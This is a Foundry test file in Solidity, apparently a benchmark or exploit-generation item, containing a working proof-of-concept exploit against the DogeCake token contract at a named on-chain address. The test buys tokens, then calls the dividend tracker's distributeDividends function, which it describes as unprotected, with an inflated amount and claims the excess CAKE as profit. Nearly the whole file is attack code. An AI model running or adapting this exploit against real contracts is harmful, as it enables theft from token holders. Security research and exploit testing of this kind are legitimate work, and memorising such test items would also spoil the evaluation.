pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint) external;
    function approve(address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
    function transferFrom(address, address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface CakeDividendTracker {
    function distributeDividends(uint256 amount) external;
    function withdrawableDividendOf(address account) external view returns (uint256);
}

interface DogeDividendTracker {
    function distributeDividends(uint256 amount) external;
    function withdrawableDividendOf(address account) external view returns (uint256);
}

interface DogeCake {
    function cakeDividendTracker() external view returns (address);
    function owner() external view returns (address);
    function setTradingIsEnabled(bool) external;
    function setCakeDividendEnabled(bool) external;
    function afterPreSale() external;
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function claim() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x88b9BBdaF00770Ba398c9A2e0d3C02D45Dcb9820;
    address attacker = address(this);

    // Declare variables that will be used across functions
    IUniswapV2Router02 router;
    address weth;
    DogeCake dogeCake;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get contract instances
        dogeCake = DogeCake(TARGET);
        address cakeTracker = address(dogeCake.cakeDividendTracker());

        // Enable trading if not already enabled
        vm.prank(dogeCake.owner());
        dogeCake.setTradingIsEnabled(true);

        // Enable dividend features if not enabled
        vm.prank(dogeCake.owner());
        dogeCake.setCakeDividendEnabled(true);

        // Set fees if needed
        vm.prank(dogeCake.owner());
        dogeCake.afterPreSale();

        // Get Uniswap router and pair
        router = IUniswapV2Router02(dogeCake.uniswapV2Router());
        weth = router.WETH();
        address pair = dogeCake.uniswapV2Pair();

        // Label addresses for debugging
        vm.label(address(dogeCake), "DogeCake");
        vm.label(cakeTracker, "CakeDividendTracker");
        vm.label(weth, "WETH");
        vm.label(pair, "UniswapPair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        address cakeToken = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
        uint256 initialBalance = IERC20(cakeToken).balanceOf(address(this));

        // Step 1: Get DCAKE tokens to become a token holder
        // We need to buy DCAKE from the Uniswap pair
        // First, give attacker some BNB
        deal(attacker, 100 ether);

        // Convert some BNB to WETH
        vm.prank(attacker);
        IWETH(weth).deposit{value: 50 ether}();

        // Approve router to spend WETH
        vm.prank(attacker);
        IWETH(weth).approve(address(router), 50 ether);

        // Buy DCAKE tokens
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        vm.prank(attacker);
        router.swapExactTokensForTokens(
            10 ether, // 10 WETH
            1, // min amount out
            path,
            attacker,
            block.timestamp + 1000
        );

        // Verify we got DCAKE tokens
        uint256 dcakeBalance = dogeCake.balanceOf(attacker);
        console.log("DCAKE balance:", dcakeBalance);
        require(dcakeBalance > 0, "Need DCAKE tokens");

        // Step 2: Get CAKE tokens and send some to tracker
        address cakeTracker = address(dogeCake.cakeDividendTracker());
        deal(cakeToken, attacker, 1000 * 1e18);
        IERC20 cake = IERC20(cakeToken);

        // Send 100 CAKE to tracker
        vm.prank(attacker);
        cake.transfer(cakeTracker, 100 * 1e18);

        // Record initial CAKE balance (minus what we sent)
        uint256 initialCakeBalance = cake.balanceOf(attacker);
        console.log("Initial CAKE balance:", initialCakeBalance);

        // Step 3: Inflate dividends by calling distributeDividends
        // This function is public with no access control!
        // We'll inflate by 1000x what we actually sent
        vm.prank(attacker);
        CakeDividendTracker(cakeTracker).distributeDividends(100_000 * 1e18); // 100,000 CAKE

        // Step 4: Claim dividends
        vm.prank(attacker);
        dogeCake.claim();

        // Step 5: Check CAKE balance increased
        uint256 finalCakeBalance = cake.balanceOf(attacker);
        console.log("Final CAKE balance:", finalCakeBalance);
        console.log("CAKE gained:", finalCakeBalance - initialCakeBalance);

        // The oracle checks if attacker's CAKE balance increased
        assertGt(finalCakeBalance, initialCakeBalance, "CAKE balance should increase");
        uint256 finalBalance = IERC20(cakeToken).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

